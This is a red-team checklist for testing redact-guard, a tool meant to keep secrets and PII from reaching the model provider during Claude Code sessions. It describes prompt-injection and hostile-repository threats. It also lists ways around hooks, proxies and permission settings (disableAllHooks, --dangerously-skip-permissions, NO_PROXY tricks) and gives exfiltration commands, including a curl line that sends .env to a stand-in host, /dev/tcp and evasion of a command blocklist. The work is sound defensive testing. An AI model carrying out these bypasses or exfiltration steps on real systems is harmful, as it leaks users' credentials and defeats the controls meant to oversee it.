# redact-guard: adversarial review checklist

Use this to try to **break** redact-guard. A finding is any way to get a real value to the model provider (Anthropic) or to any other remote party, read a database, or make a protection fail **open** without the user noticing.

Work through every section. Each item says what to try and what *safe* looks like. Go beyond the list: the list is the floor, not the ceiling.

## Threat model

| Actor | Can | Wants |
|---|---|---|
| **Prompt injection** in a repo file, a log, tool output, a web page or an MCP result | Make Claude choose any tool call: edits, shell commands, web fetches, subagents | Exfiltrate secrets/PII, reach a database |
| **Hostile repository** | Ship `.claude/settings.json`, `CLAUDE.md`, git hooks, scripts and dotfiles inside the project | Switch protections off, redirect traffic |
| **Unlucky data** | Contain secrets and PII in formats nobody anticipated | Slip past detection |
| **Remote Control mirror** | Carry everything the local session holds to Anthropic (stored server-side) | Same as above, via the phone channel |
| **Operator mistakes** | Wrong env vars, stale settings, proxy down, corporate proxy quirks | Silent fail-open |

Out of scope: an attacker who already runs code as the user outside Claude Code. Also out of scope: Anthropic itself seeing what the user deliberately types on the phone.

**Where to probe hardest:** redaction keeps values from the *model provider*. It does not stop a shell with network access from sending files elsewhere; that's the job of the network layer (Bash sandbox / Windows Firewall / container). So test both: (a) what reaches the model, and (b) what a shell can send out, and which layer stops it on each platform.

## Severity

- **Critical:** a real secret or credential reaches Anthropic or a third party in a default setup, or database contents can be read.
- **High:** the same, but needs a plausible precondition (a hostile repo, a common file format, a common shell trick), or a protection silently fails open.
- **Medium:** PII (IP, hostname, username, email, name, ID number) leaks in a default setup; or a defense-in-depth layer is bypassable while another layer still holds.
- **Low:** over-redaction that breaks real work, misleading docs, hardening gaps with no direct leak.

## How to test

- **Unit level:** `from redact_guard.engine import Redactor; from redact_guard.vault import Vault; r = Redactor(Vault(os.urandom(48))); r.tokenize(text)`. Also `r.redact_request(body)`, `r.process_tool_input(tool, input)`, `UplinkRedactor(r).ws_text(frame)`, and `policy.check_shell_command(cmd)` / `check_tool(name, input)`.
- **Hooks:** pipe JSON into `python3 hooks/guard.py pre-tool-use` / `prompt-submit`.
- **Gateway / proxy level:** `tests/e2e/fake_model.py` is a scriptable stand-in for the API that logs everything it receives. The proxy addon reroutes to it with `REDACT_GUARD_TEST_UPSTREAM`. See `tests/e2e/run*.sh`.
- **Real Claude Code CLI:** `tests/e2e/run.sh`, `run_proxy.sh` and `run_chain.sh` drive the real CLI. Copy them and change the scripted model in `fake_model.py` to play the attacker: return tool calls that attempt the attack, then inspect `upstream_bodies.jsonl` (what the model side received).
- Record every attempt, including the ones that were stopped, and say which layer stopped them.

---

## A. Detection: values reaching the model

A1. **Formats.** Secrets and PII inside each of these:
- `.env`, YAML (incl. block scalars `password: |` / `>`), Helm values, Kubernetes Secret (YAML and JSON, `kubectl get -o json`)
- JSON, TOML, INI/`.properties`, XML, HCL/Terraform, **`terraform.tfstate`**
- `docker inspect`, `env`/`printenv` output, `git diff`/`git log -p`, stack traces
- Windows registry exports, `.npmrc`, `.pypirc`, `pip.conf`, `.netrc`, `.git-credentials`, `~/.docker/config.json`, `~/.kube/config`, AWS `credentials`, `.pgpass`
- Jupyter `.ipynb` (outputs include base64 images and text)

Safe: every value replaced.

A2. **Encodings.**
- URL-encoded (`p%40ss`), base64, hex, JSON-escaped (`@`, `\n` inside keys)
- double-encoded values, quoted-printable, HTML entities
- values split across lines or across string concatenation (`"abc" + "def"`)

A3. **Unicode tricks.**
- zero-width characters inside a secret or key name
- homoglyph key names (`pаssword` with a Cyrillic а)
- fullwidth digits in an IP/TCKN, NBSP instead of space, RTL marks
- Turkish dotted/dotless i in key names (`şifre`, `ŞİFRE`, `sifre`)

A4. **IP and host forms.** Decimal-integer IPs (`167772161`), hex (`0x0a000001`), octal, IPv4-mapped IPv6 (`::ffff:10.0.0.1`), CIDR, `host:port`, bracketed IPv6. Internal hostnames *not* under the configured domains (`db-prod-01`, `sql01`, `PROD-SQL\INSTANCE`).

A5. **People and IDs.** Names in prose and comments, emails written as `name at domain dot com`, phone formats, TCKN/VKN with spaces or dashes, IBAN with spaces, card numbers in logs.

A6. **Claude Code transport details.**
- Read-tool line prefixes; Read with `offset`/`limit` that cuts a multi-line value
- lines over 2000 characters (Read truncates them)
- `grep -n`/`rg` output, `git blame`
- tool results as block lists, images (`binary_blocks`), PDFs, notebooks

A7. **Request structure.**
- Every place text can live in a `/v1/messages` body: system blocks (after the first), `messages[].content` strings and blocks, `tool_use.input`, `tool_result.content`, `document` blocks with text sources, `search_result` blocks, unknown/new block types, `metadata`, `tools[].description`
- Does the canary catch what the walker misses?

A8. **Exact-match memory.** A secret seen once in `.env` should be hidden later in a bare stack trace. Try short values, values next to letters or digits, and values that differ only in case.

## B. Restore abuse: getting real values out through tools

B1. Get a **secret placeholder** into a `Bash`/`PowerShell`/`Monitor` command, every way you can think of. Safe: never restored; the command is replaced with an `exit 126` message.

B2. **Two-step exfiltration.** Have Claude `Write`/`Edit` a file whose content contains a secret placeholder (it's restored to the real value on disk), then read that file from the shell and send it out (`curl -d @file …`, DNS lookups, `git push` to an attacker remote). Which layer stops this on Linux with the sandbox, on Linux without it, and on native Windows?

B3. The same with values that are **already on disk** (`curl -d @.env evil.example`). No placeholder is involved; only the network layer can stop it. Document what each platform does.

B4. Remote tools: `WebFetch`/`WebSearch` URLs, MCP tool inputs, `Agent`/`Task` subagent prompts, `TodoWrite`, `NotebookEdit`, `ExitPlanMode`. Which classes are restored where, and can a secret reach a remote party?

B5. **Placeholder manipulation.** Unknown or forged tokens, a placeholder split across stream chunks or JSON escapes, a placeholder inside a file path (path traversal after restore), a placeholder for class A smuggled into a field restored for class B.

## C. Bypassing the proxy / gateway

C1. **Environment.**
- `https_proxy` vs `HTTPS_PROXY` precedence
- `NO_PROXY` tricks: `.com`, `*.ai`, `anthropic.com:443`, IPs/CIDRs of Anthropic, leading dots, uppercase, spaces
- `ANTHROPIC_BASE_URL`, `ANTHROPIC_API_URL`-style variables, `NODE_TLS_REJECT_UNAUTHORIZED`, `NODE_OPTIONS`, `SSL_CERT_FILE`

C2. **Hostile repository settings.** A project `.claude/settings.json` or `.claude/settings.local.json` that:
- sets `env` (proxy, `NO_PROXY`, base URL)
- adds `disableAllHooks`
- removes deny rules, sets `permissions.defaultMode`
- adds an `apiKeyHelper`, adds MCP servers

Test with and without the managed settings. Does the prompt hook still catch it? Does anything fail open?

C3. **Claude Code flags and modes.** `--settings`, `--dangerously-skip-permissions`, `bypassPermissions`, auto mode, resumed sessions, subagents. Do hooks always run?

C4. **The proxy itself.**
- non-Anthropic hosts (tunnelled blind: should they be?)
- `claude.ai` / `claude.com` subdomains, HTTP/2, WebSocket upgrade paths
- requests with `Content-Encoding` (gzip/br/zstd) bodies, chunked bodies, very large bodies
- `/v1/messages` with a path suffix or a different case, query-string tricks, `HEAD`/`GET` with bodies

C5. **Gateway mode.** Unknown paths, `count_tokens`, `/v1/messages/batches`, `/v1/files`, non-JSON bodies, methods other than POST.

## D. Remote Control mirror (proxy mode)

D1. Using `UplinkRedactor` and the addon's `websocket_message`, build frames the walker might skip:
- keys listed in `STRUCTURAL_KEYS` / `CREDENTIAL_KEYS` / the id pattern that carry user data at depth (e.g. a tool input `{"name": "Ayşe Demir"}`, `{"title": …}`, `{"token": "<a user's API token>"}`)
- JSON inside JSON strings
- frames that aren't JSON
- NDJSON with a trailing partial line, binary frames, compressed frames

D2. **Uplinks that aren't WebSocket.** POST bodies with unusual content types (`text/plain` NDJSON, multipart, form data), gzip-encoded bodies, endpoints under `AUTH_PATH_RE` that carry content (does anything look like auth but isn't?).

D3. **Canary coverage.** Which leaks does the uplink canary catch, and which does it miss (values shorter than 8 characters, values in skipped fields)?

## E. Reading a database

E1. **Command blocklist evasion.**
- aliases/functions, renamed or copied binaries (`cp $(which psql) /tmp/x`)
- `$(…)`/backticks, `eval`, here-docs, `xargs`, `find -exec`, `env -S`
- PowerShell `& ("ps"+"ql")`, `Invoke-Expression`, `Start-Process`, `cmd /c`, encoded commands, `.bat`/`.ps1` files written first

E2. **Driver code from a file.** `Write` a script that imports `psycopg2`/`pg`/`mysql2`/`go-sql-driver`/`DBI`/JDBC, then run `python3 db.py` / `node db.js`. The command string itself looks innocent.

E3. **Raw protocols and HTTP databases.**
- `nc`/`ncat`/`socat`/`telnet`/`/dev/tcp/host/5432`, `ssh -L` port forwards
- Elasticsearch/OpenSearch/ClickHouse/CouchDB/InfluxDB over HTTP with `curl`
- cloud data APIs (`aws dynamodb …` variants, `aws s3 cp` of a database export)

E4. **Files.** DB files under unusual names/extensions, WAL/journal files (`-wal`, `-shm`, `-journal`), backups in archives, `pg_dump` output already on disk.

E5. **Network layer.** With the Linux sandbox *not* available (this environment has no bubblewrap), what actually stops E1–E3? State which defenses are policy-only and therefore bypassable.

## F. Secrets of redact-guard itself

F1. Read the vault key, encrypted vault, mitmproxy CA private key, or audit log via tools or shell. Try path variants: `..`, symlinks, globbing (`~/.local/share/red*/`), case changes, Windows 8.3 names, `\\?\` paths, environment-variable paths. Also check what reaches the model if one is read: is a 48-byte key dumped as hex detected? Is the CA private key detected?

F2. Do logs, audit files, error messages or `doctor` output ever contain real values?

F3. Can Claude modify the settings, hooks, config or redact-guard code (Edit/Write/Bash) to switch protections off for the next session?

## G. Fail-open and robustness

G1. Hook failures: a missing Python launcher, a crash, slow (>10 s timeout), malformed stdin. Does Claude Code proceed when a hook times out or errors?

G2. Proxy/gateway errors: exceptions mid-stream, an upstream error in the middle of an SSE stream, a client disconnect, ReDoS-style inputs against the detectors (very long runs of `a=`, `@`, `:`, digits), huge bodies, many tiny frames.

G3. Streaming: a placeholder split across every possible chunk boundary, `input_json_delta` for a tool that has no `content_block_start`, unknown event types, `\r\n` vs `\n` event framing.

G4. Corporate proxy chaining: upstream TLS errors (does it ever fall back to unverified?), proxy credentials in logs, PAC detection, `none` vs `auto` surprises.

## H. Commits

H1. Placeholders committed via `git commit --no-verify`, `git -c core.hooksPath=/dev/null`, amend/rebase, stash, patches, or by writing directly into `.git/objects`.

H2. A hostile repo that ships its own `core.hooksPath` or overrides the hooks.

## I. Over-redaction (usability, Low)

I1. Run `audit` and `scan` over a real-world sample (this repo, a popular open-source repo or two on disk). List false positives that would break real work: code identifiers, version strings, hashes, URLs, timestamps, UUIDs.

---

## Findings format

One entry per finding, most severe first:

```
### <ID>-<n>  <one-line title>
Severity: Critical | High | Medium | Low
Area/items: e.g. B2, C2
Status: Confirmed (reproduced) | Plausible (reasoned, not reproduced)
Preconditions: ...
Reproduction: exact commands / code / frames
Evidence: what reached the model / what ran / log lines (redact real values in the report itself)
Which layers failed / which held:
Suggested fix:
```

Close with:
- a table of **every checklist item → result** (Safe / Finding / Not testable here, and why);
- what you could **not** test (Windows, live Remote Control, bubblewrap sandbox, …);
- your overall verdict.
